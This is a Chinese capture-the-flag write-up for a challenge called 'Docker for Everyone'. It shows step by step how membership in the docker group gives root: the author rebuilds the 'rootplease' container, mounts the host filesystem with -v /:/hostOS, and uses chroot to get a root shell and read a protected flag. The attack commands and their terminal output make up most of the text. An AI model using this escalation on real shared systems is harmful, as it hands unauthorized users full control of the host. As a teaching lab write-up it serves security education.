## 12. Docker for Everyone

### 尝试与解决

> 关键词：搜索

#### 先让我看到 flag 在哪

简单探索 flag 的位置，

```plain
alpine:~$ cd /
alpine:/$ ls -l
total 69
--- snip ---
drwxr-xr-x   28 root     root          4096 Oct 25 12:59 etc
lrwxrwxrwx    1 root     root            13 Oct  8 12:10 flag -> /dev/shm/flag
drwxr-xr-x    3 root     root          4096 Oct  4 08:39 home
--- snip ---
alpine:/$ ls -l /dev/shm/
total 4
-r--------    1 root     root           512 Nov  4 11:10 flag
alpine:/$ 
```

没错，`/flag` 是一个指向 `/dev/shm/flag` 的符号链接，而 `/dev/shm/flag` 只有 `root` 用户才能读取。看起来这题要做的就是利用 Docker 越权读取这个文件。

#### 搜索漏洞

看起来这是个 Docker 题，甚至是利用 Docker 的漏洞，真不熟。然而，题目分类指明了方向——这根本不是 binary 题，而是个 general 题。

X 是实验室机器的管理员，为了在保证安全的同时让同学们都用上 docker，他把同学的账号加入了 docker 用户组，这样就不需要给同学 sudo 权限了！大概率**不止 X 一人**是这么想的。但既然有这道题，**事实肯定并非如此**。如此严重的安全误区，网上一定有所警示，不妨搜搜看。

搜索“is it safe to add user to docker group”，果不其然，网上许多文章推荐使用这种做法，理由就是使用 Docker 的用户不需要访问 `sudo`，非常“安全”。然而，很快我们就找到了一个问题：[What are the advantages of putting a user into the `docker` group instead of granting her `sudo` access to the host?](https://serverfault.com/questions/929115/what-are-the-advantages-of-putting-a-user-into-the-docker-group-instead-of-gra)

为什么这个标题是很重要的线索呢？题主问的是，为什么将用户放入 `docker` 组比授予她 `sudo` 访问权更好呢？这意味着，题主很可能已经意识到，放入 `docker` 用户组实际上和授予 `sudo` 访问权没有区别！看看正文，果然，

> However, by granting an unprivileged user the power to create arbitrary containers, it seems that user gains effective root access to the host: for example, it becomes quite easy that way to modify the host fs through bind mounts. Or to interact with the kernel via `procfs`/`sysfs`. So what's the point in putting someone into the `docker` group rather than giving that user root access to the system?

后面还紧跟着一个评论，

> Or the user could just [load a nice convenient Docker container that throws them straight into a root shell](https://fosterelli.co/privilege-escalation-via-docker.html).
>
> Granting access to the docker socket does indeed virtually guarantee the ability to escalate privileges.

两人都认为授予 Docker 完全访问权相当于授予 root 权限，而且后者给了一个用来获取 root 权限的 Docker 容器示例，

```plain
johndoe@testmachine:~$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
[...]
You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
# whoami
root
# 
```

正是解决这道题所需要的。

#### 修改容器代码

然而题目环境没有网络，我们并不能直接部署 `chrisfosterelli/rootplease`。不过，我们可以去 GitHub 上找来[这个容器的源代码](https://github.com/chrisfosterelli/dockerrootplease)。出奇的简单，只有两个文本文件 `Dockerfile` 和 `exploit.sh`。`Dockerfile` 的内容如下：

```docker
FROM ubuntu:20.04
COPY exploit.sh /exploit.sh
CMD ["/bin/bash", "exploit.sh"]
```

要将这个容器在题目环境中跑起来，需要更改两处：

首先，容器基于 `ubuntu:20.04`，题目环境没有网络，是无法获取的。但是，题目提供了已经部署好的 `alpine:latest` 环境。因此将第一行改成：

```docker
FROM alpine:latest
```

其次，题目提供的 `alpine:latest` 中没有 `/bin/bash`，只有 `/bin/sh`。因此将第三行改成：

```docker
CMD ["/bin/sh", "exploit.sh"]
```

#### 起爆容器

题目环境的 `~` 下是只读的，无法创建我们容器所需的文件。但是，有一个地方几乎总是可以的——虚拟内存盘 `/dev/shm`。

题目环境没有 `vim`，没有 `nano`。但是，执行命令 `cp /dev/tty <filename>`，然后将文本内容粘贴进去，按 Ctrl + D（表示 EOF），就可以创建文本文件。

```plain
alpine:~$ cd /dev/shm
alpine:/dev/shm$ mkdir exploit
alpine:/dev/shm$ cd exploit
alpine:/dev/shm/exploit$ cp /dev/tty Dockerfile
FROM alpine:latest
COPY exploit.sh /exploit.sh
CMD ["/bin/sh", "exploit.sh"]
alpine:/dev/shm/exploit$ cp /dev/tty exploit.sh
if [ ! -d "/hostOS" ]; then
--- snip ---
chroot /hostOS /bin/sh
alpine:/dev/shm/exploit$ 
```

然后按照 GitHub 仓库中的提示运行，

```
alpine:/dev/shm/exploit$ docker build -t rootplease .
DEPRECATED: The legacy builder is deprecated and will be removed in a future release.
            Install the buildx component to build images with BuildKit:
            https://docs.docker.com/go/buildx/

Sending build context to Docker daemon  3.584kB
Step 1/3 : FROM alpine:latest
 ---> 187eae39ad94
Step 2/3 : COPY exploit.sh /exploit.sh
 ---> 4e090535ee31
Step 3/3 : CMD ["/bin/sh", "exploit.sh"]
 ---> Running in 4bca2f8ee2ce
Removing intermediate container 4bca2f8ee2ce
 ---> abde7172dff2
Successfully built abde7172dff2
Successfully tagged rootplease:latest
alpine:/dev/shm/exploit$ docker run -v /:/hostOS -it --rm rootplease

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
/ # 
```

现在我们有了一个 root shell 了，可以迫不及待地，

```plain
/ # cat /flag
flag{u5e_r00t1ess_conta1ner_4e2c3bbf62_plz!}
/ # 
```

### Flag

```plain
flag{u5e_r00t1ess_conta1ner_4e2c3bbf62_plz!}
```

Use rootless container, please!

不只是 Docker for everyone，还是 Root for everyone！因此，出题人建议使用 rootless container。不过具体怎么搞我也不到啊。

### 想清楚

这道题算是被“投机取巧”地做完了。但是，既然 `rootplease` 容器的代码这么短，为何不一探究竟，看看提权是如何实现的呢？我们看看 `exploit.sh` 做了啥。

```bash
if [ ! -d "/hostOS" ]; then
  # --- snip --- (show error)
  exit
fi

if [ ! -f "/hostOS/bin/sh" ] && [ ! -L "/hostOS/bin/sh" ]; then
  # --- snip --- (show error)
  exit
fi

# --- snip --- (show notice)
chroot /hostOS /bin/sh
```

似乎唯一的工作就是以 `/hostOS` 为根目录启动了一个容器内的 shell。看起来，`/hostOS` 是一个指向宿主系统的目录，为什么会这样呢？这是因为运行时加了一个参数：

```plain
alpine:/dev/shm/exploit$ docker run -v /:/hostOS -it --rm rootplease
```

没错，就是 `-v /:/hostOS`。我们运行题目所给的 `alpine` 容器时应该可以如法炮制。

```plain
alpine:~$ docker run -it --rm -v /:/hostOS alpine
/ # cd /hostOS
/hostOS # ls
bin         flag        media       root        swap        var
boot        home        mnt         run         sys
dev         lib         opt         sbin        tmp
etc         lost+found  proc        srv         usr
/hostOS # cat /flag
cat: can't open '/flag': No such file or directory
/hostOS # 
```

有了！但是无法读取，为什么呢？因为符号链接现在指向的是**容器内的** `/dev/shm/flag`。有两种方法解决：

其一，按照 `rootplease` 容器内的做法，更换根目录到 `/hostOS`，

```plain
/hostOS # chroot . /bin/sh
/ # cat /flag
flag{u5e_r00t1ess_conta1ner_4e2c3bbf62_plz!}
/ # 
```

其二，直接读取 `/hostOS/dev/shm/flag`，

```plain
/hostOS # cat dev/shm/flag
flag{u5e_r00t1ess_conta1ner_4e2c3bbf62_plz!}
/hostOS # 
```

这题的正常做法应该就是这样（而不是向奇怪的 `/dev/shm` 里写入一堆奇怪的 Docker 文本文件并执行）。
